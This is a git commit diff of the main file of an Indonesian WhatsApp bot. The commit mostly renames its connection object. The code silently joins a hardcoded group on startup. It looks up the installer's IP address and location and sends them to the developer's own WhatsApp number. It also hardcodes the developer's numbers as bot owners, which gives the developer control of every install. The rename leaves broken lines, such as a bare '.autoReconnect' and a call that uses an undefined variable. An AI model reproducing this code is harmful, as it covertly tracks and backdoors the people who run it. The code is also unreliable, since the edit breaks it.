e17b2ad76d47ebc5a1894607a16b4637f6574eed
IMpoSIbbLE990 <73650475+wgduwjej@users.noreply.github.com>
2021-10-26 10:40:06 +0700

    Update index.js

--- index.js
+++ index.js
@@ -1,7 +1,7 @@
 const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
 const simple = require('./lib/simple.js')
 const WAConnection = simple.WAConnection(_WAConnection)
-const denz = new WAConnection()
+const impo = new WAConnection()
 const qrcode = require("qrcode-terminal")
 const moment = require("moment-timezone")
 const fs = require("fs")
@@ -20,47 +20,47 @@ return new Promise(resolve => setTimeout(resolve, ms))
 nocache('./imp.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))
 
 async function starts() {
-denz.autoReconnect = ReconnectMode.onConnectionLost
-    denz.version = [2, 2119, 6]
-    denz.logger.level = 'warn'
-    denz.browserDescription = ['F','Desktop','3.0']
+.autoReconnect = ReconnectMode.onConnectionLost
+    impo.version = [2, 2119, 6]
+    impo.logger.level = 'warn'
+    impo.browserDescription = ['F','Desktop','3.0']
     await sleep(10000)
-    denz.on('qr', qr => {
+    impo.on('qr', qr => {
         qrcode.generate(qr, { small: true })
         console.log(color('|TRM|'), color('Scan this QR code', 'cyan'))
     })
-    fs.existsSync('./QRnya.json') && denz.loadAuthInfo('./QRnya.json')
+    fs.existsSync('./QRnya.json') && impo.loadAuthInfo('./QRnya.json')
     
-    denz.on('credentials-updated', () => {
+    impo.on('credentials-updated', () => {
         console.log(color('|TRM|'), color('credentials updated!', 'cyan'))
         })
      
-      await denz.connect({ timeoutMs: 30 * 1000 });
-  fs.writeFileSync("./QRnya.json",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"));
+      await impo.connect({ timeoutMs: 30 * 1000 });
+  fs.writeFileSync("./QRnya.json",JSON.stringify(impo.base64EncodedAuthInfo(), null, "\t"));
  teks = `https://chat.whatsapp.com/wjskdjd`
- denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
+ impo.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Joined to IMP-XBOT group', 'cyan'))
- denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer IMP-XBOT",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./imp.jpg'),sourceUrl:"https://wa.me/6285774523785?text=Assalamualaikum"}}})
+ impo.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(impo.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer IMP-XBOT",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./imp.jpg'),sourceUrl:"https://wa.me/6285774523785?text=Assalamualaikum"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("6285774523785@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer IMP-XBOT",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./imp.jpg'),sourceUrl:"https://wa.me/6285774523785?text=Assalamualaikum"}}})
+       impo.sendMessage("6285774523785@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer IMP-XBOT",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./imp.jpg'),sourceUrl:"https://wa.me/6285774523785?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
-    denz.on('connecting', () => {
+    impo.on('connecting', () => {
 		console.log(color('|TRM|'), color('Connecting...', 'cyan'))
 		})
 	
-	denz.on('open', () => {
+	impo.on('open', () => {
 	console.log(color('|TRM|'), color('Connected', 'cyan'))
 	}) 
      
-    denz.on('ws-close', () => {
+    impo.on('ws-close', () => {
         console.log(color('|TRM|'), color('Connection lost, trying to reconnect.', 'cyan'))
         })
     
-    denz.on('close', async () => {
+    impo.on('close', async () => {
         console.log(color('|TRM|'), color('Disconnected.', 'cyan'))
         })
     
@@ -68,17 +68,17 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
 exec(`cd /sdcard/download && play *mp3`)
 }
    
-   denz.on('chat-update', async (mek) => {
-        require('./denz.js')(denz, mek)
+   impo.on('chat-update', async (mek) => {
+        require('./impo.js')(denz, mek)
         ownerNumber = ["6285774523785@s.whatsapp.net","6283125187277@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
         dtod = "6285774523785@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
     
     //SERAH LU MAU GANTI KYK MANA
-        denz.on('group-participants-update', async (anu) => {
+        impo.on('group-participants-update', async (anu) => {
            mem = anu.participants[0]
-			const mdata = await denz.groupMetadata(anu.jid)
+			const mdata = await impo.groupMetadata(anu.jid)
 		    try {
 			console.log(anu)
 			if (anu.action == 'add') {
@@ -87,56 +87,56 @@ exec(`cd /sdcard/download && play *mp3`)
 			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6281337541779:6281337541779\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
 		    num = anu.participants[0]
 			try {
-			ppimg = await denz.getProfilePicture(`${num.split('@')[0]}@c.us`)
+			ppimg = await impo.getProfilePicture(`${num.split('@')[0]}@c.us`)
 			} catch {
 			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
 			}
 			let buff = await getBuffer(ppimg)
 			masuk =`Halo @${num.split('@')[0]}\nSelamat Datang Di ${mdata.subject}\n\n*Jangan Lupa Isi*\n*Nama* :\n*Umur* :\n*Gender* :\n*Askot* :\n\nEnjoy Jangan Lupa Kenalan\nKlik Button Di Bawah Untuk Memulai Bot\nNote Jika Tidak Ada Ketik .allmenu`
 			gbutsan = [{buttonId:'SERAH',buttonText:{displayText:'👋Welcome'},type:1}]
-			mhan = await denz.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
+			mhan = await impo.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
 const buttonMessages = { imageMessage: mhan.message.imageMessage,
 contentText: `${masuk}`,
 footerText: `Welcome  Information`, 
 buttons: gbutsan,
 headerType: 4 }
-			denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {thumbnail: fs.readFileSync('./imp.jpg'), "contextInfo": { mentionedJid: [num]}, caption: 'Tes', quoted: fkontakk})
+			impo.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {thumbnail: fs.readFileSync('./imp.jpg'), "contextInfo": { mentionedJid: [num]}, caption: 'Tes', quoted: fkontakk})
 			} else if (anu.action == 'remove') {
 			const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
         	if(!welkom.includes(mdata.id)) return
 			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6281337541779:6281337541779\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
 			num = anu.participants[0]
 			try {
-			ppimg = await denz.getProfilePicture(`${num.split('@')[0]}@c.us`)
+			ppimg = await impo.getProfilePicture(`${num.split('@')[0]}@c.us`)
 			} catch {
 			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
 			}
 			let buff = await getBuffer(ppimg)
 			keluar =`Selamat tinggal @${num.split('@')[0]}\nSemoga tentang disana`
 			gbutsan = [{buttonId:'SERAH',buttonText:{displayText:'👋Byee'},type:1}]
-			mhan = await denz.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
+			mhan = await impo.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
 const buttonMessages = { imageMessage: mhan.message.imageMessage,
 contentText: `${keluar}`,
 footerText: `Leave Information`,
 buttons: gbutsan,
 headerType: 4 }
-			denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, { thumbnail: fs.readFileSync('./imp.jpg'), "contextInfo": { mentionedJid: [num]}, caption: 'Tes', quoted: fkontakk})
+			impo.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, { thumbnail: fs.readFileSync('./imp.jpg'), "contextInfo": { mentionedJid: [num]}, caption: 'Tes', quoted: fkontakk})
 			} else if (anu.action == 'promote') {
 fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6281337541779:6281337541779\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
 shp = '◦➛'
-var thu = await denz.getStatus(anu.participants[0], MessageType.text)
+var thu = await impo.getStatus(anu.participants[0], MessageType.text)
 num = anu.participants[0]
 teks = `*P R O M O T E - D E T E C T E D*\n\n${shp} Username: @${num.split('@')[0]}\n\n${shp} Bio : ${thu.status}\n\n${shp} Time : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\n\n${shp} Group: ${mdata.subject}\n\nDon't break the rules!`
-denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
+impo.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
 console.log(color('|TRM|'), color(`Promote Member ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
 } 
 else if (anu.action == 'demote') {
 fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6281337541779:6281337541779\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
 shp = '◦➛'
-thu = await denz.getStatus(anu.participants[0], MessageType.text)
+thu = await impo.getStatus(anu.participants[0], MessageType.text)
 num = anu.participants[0]
 teks = `*D E M O T E - D E T E C T E D*\n\n${shp} Username: @${num.split('@')[0]}\n\n${shp} Bio : ${thu.status}\n\n${shp} Time : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\n\n${shp} Group: ${mdata.subject}`
-denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
+impo.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
 console.log(color('|TRM|'), color(`Demote Admin ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
 }
 		    } catch (e) {
@@ -144,55 +144,55 @@ console.log(color('|TRM|'), color(`Demote Admin ${num.split('@')[0]} In ${mdata.
 		    }
 	        })	       
 
-	denz.on('group-update', async (anu) => {
-		const metdata = await denz.groupMetadata(anu.jid)
+	impo.on('group-update', async (anu) => {
+		const metdata = await impo.groupMetadata(anu.jid)
     	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6285774523785:6285774523785\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
     if(anu.announce == 'false'){
     teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
-    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    impo.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
     console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
   }
   else if(anu.announce == 'true'){
     teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
-    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    impo.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
     console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
   }
   else if(!anu.desc == ''){
     tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
     teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
-    denz.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
+    impo.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
     console.log(color('|TRM|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
   }
   else if(anu.restrict == 'false'){
     teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
-    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    impo.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
     console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
   }
   else if(anu.restrict == 'true'){
     teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
-    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    impo.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
     console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
   }
 })
 
-denz.on('CB:action,,call', async json => {
+impo.on('CB:action,,call', async json => {
         const callerId = json[2][0][1].from;
         var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
-        denz.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
-        denz.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./imp.jpg'),sourceUrl:`https://wa.me/6285774523785?text=Assalamualaikum`}}})
+        impo.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
+        impo.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./imp.jpg'),sourceUrl:`https://wa.me/6285774523785?text=Assalamualaikum`}}})
         await sleep(5000)
-        await denz.blockUser(callerId, "add")
+        await impo.blockUser(callerId, "add")
         })
         
-	denz.on('message-delete', async (m) => {
+	impo.on('message-delete', async (m) => {
 if (!m.key.fromMe && !antidelete) {
 if (!m.key.remoteJid == 'status@broadcast') return
 m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
 const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
 let d = new Date
-let c = denz.chats.get(m.key.remoteJid)
+let c = impo.chats.get(m.key.remoteJid)
 let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
-let co3ntent = denz.generateForwardMessageContent(a, false)
+let co3ntent = impo.generateForwardMessageContent(a, false)
 let c3type = Object.keys(co3ntent)[0]
 let locale = 'id'
 let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
@@ -203,8 +203,8 @@ day: 'numeric',
 month: 'long',
 year: 'numeric'
 })
-denz.copyNForward(m.key.remoteJid, m.message)
-denz.sendMessage(m.key.remoteJid, `▷\`\`\`Anti Delete\`\`\`
+impo.copyNForward(m.key.remoteJid, m.message)
+impo.sendMessage(m.key.remoteJid, `▷\`\`\`Anti Delete\`\`\`
 
 ▢ \`\`\`Nama : @${m.participant.split("@")[0]}\`\`\`
 ▢ \`\`\`Tipe : ${c3type}\`\`\`
@@ -224,7 +224,7 @@ function doProgress()
 	{
 		setTimeout( function() { console.clear(),
 		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
-			console.log(stdout), console.log(bgcolor('https://github.com/dcode-denpa/bitch-boot', 'cyan'))})}, 200 ) ;
+			console.log(stdout), console.log(bgcolor('https://github.com/wgduwjej/Bot-wa', 'cyan'))})}, 200 ) ;
 	}
 	else
 	{
@@ -237,7 +237,7 @@ console.log(color(figlet.textSync(`${settings.NamaBot}`, {
 		vertivalLayout: 'default',
 		width: 80,
 		whitespaceBreak: true
-	    }), 'lightgreen')), term.slowTyping(' Created By Denis Putra' ,{ flashStyle: term.brightWhite })
+	    }), 'lightgreen')), term.slowTyping(' Login' ,{ flashStyle: term.brightWhite })
 progressBar = term.progressBar( {
 	width: 80 ,
 	title: '\n\nLoading' ,
